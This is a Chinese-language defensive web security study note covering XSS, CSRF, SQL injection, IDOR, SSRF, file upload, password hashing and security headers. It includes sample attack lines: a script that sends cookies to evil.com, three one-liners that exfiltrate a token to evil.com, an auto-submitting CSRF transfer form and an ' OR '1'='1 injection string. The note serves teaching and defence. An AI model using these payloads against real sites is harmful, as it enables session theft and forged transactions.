# Web 安全

## 概述

Web 安全的核心问题只有一句话：**不能信任来自客户端的任何输入，也不能假设客户端会按你设计的方式使用你的系统。**

浏览器提供了一系列安全机制，但每种机制的职责边界都很窄。初学者最常见的错误是把它们混为一谈，以为配了其中一个就万事大吉。先把这张地图记住：

| 机制 | 防什么 | 防不了什么 |
|------|--------|------------|
| 同源策略 / CORS | 其他源的脚本**读取**你的响应数据 | XSS、CSRF |
| CSRF Token / SameSite | 跨站伪造请求 | XSS（脚本能读到 token） |
| **CSP** | **XSS 脚本的执行与数据外传** | SQL 注入、越权等服务端问题 |
| HttpOnly Cookie | JS 读取 Cookie | XSS 本身（攻击者仍可借浏览器身份发请求） |
| 预编译 SQL | SQL 注入 | 前端所有问题 |

**这些机制之间不能互相替代。**

## 同源策略与 CORS 的安全边界

详细的 CORS 配置见 [跨域-CORS 生产实践](../../java-template/跨域/notes.md)，这里只讲它的安全定位。

同源策略防的是「**别的站点的脚本来读你的数据**」。它有两个关键的不管：

1. **不管请求发送**。它拦截的是响应的读取，不是请求的发出（简单请求照发不误）
2. **不管同源脚本**。只要脚本运行在你的域下，它就完全不介入

这两条正好对应了 CSRF 和 XSS 两类攻击 —— 这也是为什么必须有额外的防御手段。

## XSS（跨站脚本攻击）

### 是什么

攻击者把恶意脚本注入到你的页面里，让它在其他用户的浏览器中执行。

最典型的场景：评论区提交 `<script>fetch('https://evil.com?c='+document.cookie)</script>`，如果后端原样存储、前端原样渲染，那么每个浏览这条评论的用户都会执行这段代码。

### 三种类型

| 类型 | 恶意代码来源 | 例子 |
|------|--------------|------|
| **存储型** | 存进了数据库，持久生效 | 评论、昵称、商品描述 —— 危害最大 |
| **反射型** | 来自 URL 参数，服务端原样吐回页面 | 搜索结果页回显关键词，需诱导用户点链接 |
| **DOM 型** | 前端 JS 直接把 URL 内容写入 DOM | `innerHTML = location.hash`，请求根本不到服务端 |

DOM 型有个特点：**恶意载荷可能只存在于 `#` 之后，根本不会发送给服务器**，所以服务端 WAF 和日志完全看不到，排查最麻烦。

### 为什么 CORS 防不住 XSS

**因为 XSS 攻击者是「同源」的。** 注入的脚本运行在你自己的页面里，它的源就是 `www.example.com`，和正牌代码一模一样。既然同源，同源策略根本不介入：

```javascript
// XSS 注入的脚本，在 www.example.com 页面内执行
// 调自家接口是同源请求，不需要任何 CORS 许可
fetch('/api/user/profile').then(r => r.json()).then(d => { /* 数据到手 */ });
```

一旦得手，攻击者拥有**和你的前端代码完全相同的权限**：读 `localStorage` 里的 token、读非 `HttpOnly` 的 Cookie、发任意同源请求（Cookie 自动携带）、**从 DOM 里读出 CSRF token 从而绕过 CSRF 防护**。

所以 XSS 被称为前端安全的「最高权限漏洞」：中了 XSS，CORS、CSRF token、SameSite 这些防线**同时全部失效**。

### 严格的 CORS 也拦不住数据外传

一个常见误解是「CORS 配得严，至少能阻止注入的脚本把数据传出去」。不行 —— **CORS 拦的是响应读取，不是请求发送**，而外传数据是纯单向操作，攻击者根本不需要读响应：

```javascript
// 以下每一种都能把数据送出去，CORS 一个都管不了
new Image().src = 'https://evil.com/?d=' + encodeURIComponent(token);
navigator.sendBeacon('https://evil.com/', token);
fetch('https://evil.com/', { method: 'POST', mode: 'no-cors', body: token });
```

`mode: 'no-cors'` 尤其能说明问题：它明确声明「我不读响应」，于是请求照发。

### 防御手段

**1. 输出转义（根本手段）**

关键在于**按输出位置选择转义方式** —— HTML 文本、HTML 属性、JS 字符串、URL 参数的转义规则各不相同。现代框架默认已做：

```javascript
// React / Vue 默认转义，安全
<div>{userInput}</div>

// 这两个是刻意留的后门，用之前必须净化
<div dangerouslySetInnerHTML={{__html: userInput}} />   // React
<div v-html="userInput"></div>                          // Vue
```

服务端模板同理，Thymeleaf 中 `th:text` 自动转义，**`th:utext` 不转义**：

```html
<p th:text="${comment}">安全</p>
<p th:utext="${comment}">高危，除非内容已净化</p>
```

需要强调的是：**转义应该在输出时做，而不是在入库时做**。同一份数据可能输出到 HTML、JSON、Excel、短信等不同场景，入库时统一转义会导致数据被污染，且无法适配所有输出上下文。

**2. CSP（Content-Security-Policy）—— 真正的兜底**

这是唯一能限制「脚本从哪来」和「数据往哪去」的机制：

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; connect-src 'self'; img-src 'self' data:; object-src 'none'
```

`connect-src 'self'` 和 `img-src 'self'` 会直接掐死上面那几种外传手段。

**前提是不要开 `unsafe-inline`**，否则等于白配 —— 内联脚本被允许，注入的 `<script>` 照样执行。上线前建议先用 `Content-Security-Policy-Report-Only` 观察一段时间，避免直接拦截打挂正常功能。

**3. 富文本场景用白名单净化**

评论、富文本编辑器这类必须允许部分 HTML 的地方：

- 前端：DOMPurify
- Java 后端：OWASP Java HTML Sanitizer

**绝不要自己写正则黑名单**，绕过方式多到数不清（大小写、编码、畸形标签、事件属性……）。

**4. HttpOnly Cookie（辅助）**

让 JS 读不到 Cookie，但**这只是提高门槛，不能根治** —— 攻击者可以直接在受害者浏览器里发请求，Cookie 由浏览器自动附带，这叫「会话骑乘」。

## CSRF（跨站请求伪造）

### 原理

攻击者诱导已登录用户访问恶意页面，由该页面向目标站点发起请求。浏览器会自动带上目标站点的 Cookie，服务端因此认为这是合法用户的操作。

```html
<!-- evil.com 上的页面，用户一打开就自动提交 -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

### 为什么同源策略防不住

因为**表单提交属于「简单请求」，浏览器照发不误，服务器照常执行**。攻击者读不到响应，但他也不需要读 —— 钱已经转走了。

这正是上面强调「同源策略不管请求发送」的实际后果。

### 防御手段

| 手段 | 说明 |
|------|------|
| **SameSite Cookie** | 设 `SameSite=Lax`（Chrome 80+ 默认）或 `Strict`，跨站请求不携带 Cookie。**目前最有效且成本最低** |
| **CSRF Token** | 服务端下发随机 token，前端提交时带上并校验。攻击者跨域读不到这个 token |
| **校验 Origin / Referer** | 服务端检查来源域名。作为辅助，Referer 可能被隐私设置剥离 |
| **改用 Token 鉴权** | 凭证放 `Authorization` 头而非 Cookie，浏览器不会自动携带，CSRF 天然失效 |

前后端分离项目普遍走最后一条 —— 用 `Authorization: Bearer <token>`，从架构上消除 CSRF。这也是 Spring Security 中前后端分离项目常见 `csrf().disable()` 的原因（**前提是确实不依赖 Cookie 鉴权，否则就是漏洞**）。

## SQL 注入

### 原理

把 SQL 语句拼接用户输入，导致输入被当作代码执行：

```java
// 危险：字符串拼接
String sql = "SELECT * FROM user WHERE name = '" + name + "'";
// name 传入 ' OR '1'='1 时，条件恒真，返回全表
```

### 防御：预编译

```java
// 正确：PreparedStatement，参数与 SQL 结构分离
String sql = "SELECT * FROM user WHERE name = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, name);
```

底层原理是 SQL 模板先被数据库编译成执行计划，参数后续单独传入，**只会被当作值，不可能改变语句结构**。

### MyBatis 的 `#{}` 与 `${}`

Java 项目最高频的注入来源：

```xml
<!-- 安全：#{} 编译为 ?，走预编译 -->
<select id="findByName">
  SELECT * FROM user WHERE name = #{name}
</select>

<!-- 危险：${} 是字符串直接拼接 -->
<select id="findByName">
  SELECT * FROM user WHERE name = '${name}'
</select>
```

**规则：一律用 `#{}`。**

只有表名、列名、`ORDER BY` 字段这类无法参数化的位置才不得不用 `${}`，此时**必须做白名单校验**：

```java
// ORDER BY 字段只能用 ${}，所以要在 Java 层限制取值范围
private static final Set<String> ALLOWED_SORT =
        Set.of("create_time", "update_time", "amount");

if (!ALLOWED_SORT.contains(sortField)) {
    throw new IllegalArgumentException("非法排序字段");
}
```

## 其他常见风险

### 越权访问（IDOR）

**实际项目中最高发、但最容易被忽略的漏洞。**

```java
// 危险：只要知道 id 就能看别人的订单
@GetMapping("/order/{id}")
public OrderDTO get(@PathVariable Long id) {
    return orderService.getById(id);
}

// 正确：查询时带上当前登录用户，做归属校验
@GetMapping("/order/{id}")
public OrderDTO get(@PathVariable Long id) {
    Long userId = SecurityUtils.getCurrentUserId();   // 从 token/session 取，绝不信任前端传参
    return orderService.getByIdAndUserId(id, userId);
}
```

两条铁律：**用户身份只能从服务端会话中取，永远不要信任前端传来的 `userId`**；每个涉及数据的接口都要校验归属关系。

### 密码存储

```java
// 错误：MD5/SHA1 可被彩虹表秒破
String hash = DigestUtils.md5Hex(password);

// 正确：BCrypt 自带随机盐，且计算慢，暴力破解成本高
PasswordEncoder encoder = new BCryptPasswordEncoder();
String hash = encoder.encode(password);
boolean ok = encoder.matches(rawPassword, hash);
```

### 文件上传

- **不能只校验扩展名和 `Content-Type`**（两者都可伪造），要读文件头魔数
- 服务端**重命名**文件，不使用原始文件名（防路径穿越 `../../`）
- 存储目录**禁止执行权限**，最好放对象存储而非应用服务器
- 限制文件大小和上传频率

### SSRF（服务端请求伪造）

后端根据用户提供的 URL 发起请求时，攻击者可诱导其访问内网服务（如云主机元数据接口）：

- 用白名单限定可访问的域名
- 禁止访问内网网段（`127.0.0.0/8`、`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`、`169.254.0.0/16`）
- **禁止自动跟随重定向**，否则白名单可被绕过

### 点击劫持

攻击者用透明 iframe 覆盖你的页面，诱导用户点击。用响应头禁止被嵌套即可（见下）。

## 安全响应头清单

生产环境建议统一配置：

| 响应头 | 推荐值 | 作用 |
|--------|--------|------|
| `Content-Security-Policy` | 按需定制 | 限制脚本来源与数据外传，防 XSS |
| `X-Frame-Options` | `DENY` | 禁止页面被 iframe 嵌套，防点击劫持 |
| `X-Content-Type-Options` | `nosniff` | 禁止浏览器猜测 MIME 类型 |
| `Strict-Transport-Security` | `max-age=31536000` | 强制 HTTPS |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | 限制 Referer 泄露的信息量 |

> **注意**：`X-XSS-Protection` 已废弃，现代浏览器移除了该功能，其过滤器本身还引入过漏洞。**不要再配置它**，用 CSP 代替。

Spring Boot 配置示例：

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp ->
            csp.policyDirectives("default-src 'self'; script-src 'self'; object-src 'none'"))
        .frameOptions(frame -> frame.deny())
        .httpStrictTransportSecurity(hsts -> hsts
            .includeSubDomains(true)
            .maxAgeInSeconds(31536000))
        .referrerPolicy(rp -> rp.policy(
            ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
    );
    return http.build();
}
```

## 常见坑点

| 认知误区 | 实际情况 |
|----------|----------|
| 配了 CORS 就安全了 | CORS 只管跨源读取，对 XSS、CSRF、注入毫无作用 |
| 前端做了校验就够了 | 前端校验只为提升体验，**服务端必须重新校验**，攻击者直接调接口 |
| 入库时转义就能防 XSS | 应在**输出时**按上下文转义，入库转义会污染数据且无法适配多种输出场景 |
| 用了 MyBatis 就没有注入 | `${}` 依然是拼接，必须用 `#{}` |
| HttpOnly 能防住 XSS | 只防 Cookie 被读取，攻击者仍可借用户身份发请求 |
| `csrf().disable()` 没问题 | 仅当不依赖 Cookie 鉴权时才成立，否则是漏洞 |
| 内网服务不用防注入 | 内网同样可能被横向渗透，纵深防御是基本原则 |

## 参考资源

- [跨域-CORS 生产实践](../../java-template/跨域/notes.md) - 同源策略与 CORS 详细配置
- [HTTP-连接管理](../HTTP/notes.md) - HTTP 协议基础
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - 业界公认的风险清单
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) - 各类漏洞的防御速查表
- [MDN - Content Security Policy](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP) - CSP 中文说明
